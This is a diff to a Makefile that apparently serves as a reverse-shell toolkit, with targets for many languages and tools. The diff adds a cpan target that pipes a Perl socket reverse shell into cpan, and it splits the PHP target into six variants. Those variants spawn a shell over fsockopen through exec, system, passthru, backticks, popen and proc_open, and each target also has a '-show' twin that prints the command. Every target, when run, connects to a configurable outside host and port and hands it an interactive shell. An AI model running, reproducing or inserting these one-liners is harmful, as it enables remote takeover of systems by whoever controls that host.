@@ -4,7 +4,7 @@ PORT	:= 4444
 PORT2	:= 4445
 TMP		:= $(or $(tmp), /tmp/f)
 
-METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl python perlphp ruby irb node jrunscript jjs julia socat pip
+METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl python perl php1 php2 php3 php4 php5 php6 ruby irb node jrunscript jjs julia socat pip cpan
 
 BOLD		:= \033[1m
 UNDERLINE	:= \033[4m
@@ -164,13 +164,53 @@ perl-show:
 
 ############################################################
 
+########################### CPAN ###########################
+
+cpan:
+	echo '! use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($(PORT),inet_aton("$(HOST)")))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("$(SHELL)");};' | cpan
+
+cpan-show:
+	@printf "echo '! use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($(PORT),inet_aton(\"$(HOST)\")))){ open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"$(SHELL)\");};' | cpan\n"
+
+############################################################
+
 ############################ PHP ###########################
 
-php:
+php1:
 	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); exec("$(SHELL) <&3 >&3 2>&3");'
 
-php-show:
+php1-show:
 	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); exec(\"$(SHELL) <&3 >&3 2>&3\");'\n"
+
+php2:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); system("$(SHELL) <&3 >&3 2>&3");'
+
+php2-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); system(\"$(SHELL) <&3 >&3 2>&3\");'\n"
+
+php3:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); passthru("$(SHELL) <&3 >&3 2>&3");'
+
+php3-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); passthru(\"$(SHELL) <&3 >&3 2>&3\");'\n"
+
+php4:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); `"$(SHELL) <&3 >&3 2>&3"`;'
+
+php4-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); \`\"$(SHELL) <&3 >&3 2>&3\"\`;'\n"
+
+php5:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); popen("$(SHELL) <&3 >&3 2>&3", "r");'
+
+php5-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); popen(\"$(SHELL) <&3 >&3 2>&3\", \"r\");'\n"
+
+php6:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); proc_open("$(SHELL)", array(0=>$$sock, 1=>$$sock, 2=>$$sock),$$pipes);'
+
+php6-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); proc_open(\"$(SHELL)\", array(0=>\$$sock,1=>\$$sock,2=>\$$sock), \$$pipes);'\n"
 
 ############################################################
 
